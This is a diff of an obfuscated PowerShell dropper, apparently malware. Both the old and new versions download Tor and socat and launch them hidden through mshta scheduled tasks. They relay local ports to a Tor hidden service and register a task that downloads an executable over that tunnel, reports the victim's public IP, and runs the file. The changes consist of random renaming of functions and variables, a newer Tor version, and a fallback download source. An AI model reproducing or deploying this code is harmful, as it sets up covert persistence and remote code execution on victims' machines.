@@ -1,7 +1,7 @@
 $SH_TYPE_SCHEDULED_TASK=1;
 $SH_TYPE_TASK_SCHEDULER=2;
 $schedulerType=$SH_TYPE_SCHEDULED_TASK;
-function Dlku
+function FeViquuLO
 {
 param([string]$zipfile, [string]$destination);
 $7z = Join-Path $env:ALLUSERSPROFILE '7za.exe';
@@ -42,16 +42,16 @@ function InitScheduller{
     }catch{
         $File=$env:Temp+'\'+(RandomString)+'.zip';
         $Dest=$env:Temp+'\'+(RandomString);
-        while (!(JhGj 'https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg' $File)) {}
+        while (!(WHPvIISILmoLx 'https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg' $File)) {}
         if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}mkdir $Dest | Out-Null;
-        Dlku $File $Dest;
+        FeViquuLO $File $Dest;
         Remove-Item -Force $File;
         $TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
         $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
         return $SH_TYPE_TASK_SCHEDULER;
     }
 }
-function AddTask
+function veXZ
 {
 param([string]$name, [string]$cmd, [string]$params='',[int]$restart=0,[int]$delay=0,[string]$dir='');
 switch ($schedulerType) {
@@ -112,31 +112,31 @@ switch ($schedulerType) {
     };
 }
 }
-function JhGj {
-    param([string]$pme, [string]$WWHUceuNqljSR);
+function WHPvIISILmoLx {
+    param([string]$bGGncncitXphn, [string]$HUxJDzjGS);
     $ErrorActionPreference = "Stop";
-    Write-Host ("Download {0} to {1}" -f ($pme, $WWHUceuNqljSR));
+    Write-Host ("Download {0} to {1}" -f ($bGGncncitXphn, $HUxJDzjGS));
     try {
-        Start-BitsTransfer -Source $pme -Destination $WWHUceuNqljSR;
+        Start-BitsTransfer -Source $bGGncncitXphn -Destination $HUxJDzjGS;
     }
     catch {
         #Write-Error $_ -ErrorAction Continue;
         try {
-            (New-Object System.Net.WebClient).DownloadFile($pme,$WWHUceuNqljSR);
+            (New-Object System.Net.WebClient).DownloadFile($bGGncncitXphn,$HUxJDzjGS);
         }
         catch {
             #Write-Error $_ -ErrorAction Continue;
-            Start-Process "cmd.exe" -ArgumentList "/b /c bitsadmin /transfer /download /priority HIGH `"$pme`" `"$WWHUceuNqljSR`"" -Wait -WindowStyle Hidden;
+            Start-Process "cmd.exe" -ArgumentList "/b /c bitsadmin /transfer /download /priority HIGH `"$bGGncncitXphn`" `"$HUxJDzjGS`"" -Wait -WindowStyle Hidden;
         }
     }finally{
         $ErrorActionPreference = "Continue";
     }
-    if ( $(Try { Test-Path $WWHUceuNqljSR.trim() } Catch { $false })){
+    if ( $(Try { Test-Path $HUxJDzjGS.trim() } Catch { $false })){
         return $true;
     }
     return $false;
 }
-function deIPMuztql{
+function ywuAYkxIMerW{
 $schedulerType = InitScheduller;
 $tf=$env:Temp+'\'+(RandomString)+'.zip';
 $DestTP=$env:ALLUSERSPROFILE+'\'+(RandomString);
@@ -144,32 +144,37 @@ $TorMirrors=@("https://dist.torproject.org/",
 "https://torproject.mirror.metalgamer.eu/dist/",
 "https://tor.ybti.net/dist/");
 foreach ($mirror in $TorMirrors) {
-    $_url=$mirror+'torbrowser/7.0.11/tor-win32-0.3.1.9.zip';
-    if((JhGj $_url $tf)){
+    $_url=$mirror+'torbrowser/7.5.2/tor-win32-0.3.2.10.zip';
+    if((WHPvIISILmoLx $_url $tf)){
         break;
     }
 }
 if ((Test-Path $DestTP) -eq 1){Remove-Item -Force -Recurse $DestTP;}mkdir $DestTP | Out-Null;
-Dlku $tf $DestTP;
+FeViquuLO $tf $DestTP;
 Remove-Item -Force $tf;
-$uRrKPFJeAClRay=$DestTP+'\Tor\';
-$sqJ="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"tor.exe`",0,False))";
-AddTask (RandomString) 'mshta.exe' $sqJ 0 0 $uRrKPFJeAClRay;
+$FEopykv=$DestTP+'\Tor\';
+$VanlMedufSmugw="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"tor.exe`",0,False))";
+veXZ (RandomString) 'mshta.exe' $VanlMedufSmugw 0 0 $FEopykv;
 $SFile=$env:Temp+'\'+(RandomString)+'.zip';
-while (!(JhGj 'https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip' $SFile)){}
-Dlku $SFile $DestTP;
-$s_old=$DestTP+'\socat-windows-1.7.2.1\';
 $s_new=(RandomString);
+$iWC=$DestTP+'\'+$s_new+'\';
+WHPvIISILmoLx 'https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip' $SFile;
+if ( $(Try { Test-Path $SFile.trim() } Catch { $false })){
+    FeViquuLO $SFile $DestTP;
+    $s_old=$DestTP+'\socat-windows-1.7.2.1\';
+    Rename-Item -path $s_old -newName $s_new;
+}else{
+    WHPvIISILmoLx 'http://blog.gentilkiwi.com/downloads/socat-1.7.2.1.zip' $SFile;
+    FeViquuLO $SFile $iWC;
+}
 Remove-Item -Force $SFile;
-Rename-Item -path $s_old -newName $s_new;
-$YEaYHaPiPsF=$DestTP+'\'+$s_new+'\';
 $s1cmd='socat tcp4-LISTEN:5555,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:80,socksport=9050';
 $s2cmd='socat tcp4-LISTEN:5588,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:5588,socksport=9050';
-$HMtJojiNUO="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s1cmd`",0,False))";
-$goVGWpoXFKOwAdW="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s2cmd`",0,False))";
-AddTask (RandomString) 'mshta.exe' $HMtJojiNUO 0 0 $YEaYHaPiPsF;
-AddTask (RandomString) 'mshta.exe' $goVGWpoXFKOwAdW 0 0 $YEaYHaPiPsF;
-$uefYCDgNP="vbsc"+"ript:close(CreateObject(`"WScript.Shell`").Run(`"powershell.exe `"`"`$F=`$env:Temp+'\\"+(RandomString)+".exe';rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile('http://127.0.0.1:5555/"+(RandomString)+".asp?ts&ip='+`$cl.Download`"+`"String('http://api.ipify.org/'),`$F);& `$F`"`"`",0,False))";
-AddTask (RandomString) 'mshta.exe' $uefYCDgNP 1;
+$EiKLYNgwdMi="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s1cmd`",0,False))";
+$haPsBDM="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s2cmd`",0,False))";
+veXZ (RandomString) 'mshta.exe' $EiKLYNgwdMi 0 0 $iWC;
+veXZ (RandomString) 'mshta.exe' $haPsBDM 0 0 $iWC;
+$LrqoSErumL="vbsc"+"ript:close(CreateObject(`"WScript.Shell`").Run(`"powershell.exe `"`"`$F=`$env:Temp+'\\"+(RandomString)+".exe';rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile('http://127.0.0.1:5555/"+(RandomString)+".asp?ts&ip='+`$cl.Download`"+`"String('http://api.ipify.org/'),`$F);& `$F`"`"`",0,False))";
+veXZ (RandomString) 'mshta.exe' $LrqoSErumL 1;
 }
-deIPMuztql;
+ywuAYkxIMerW;
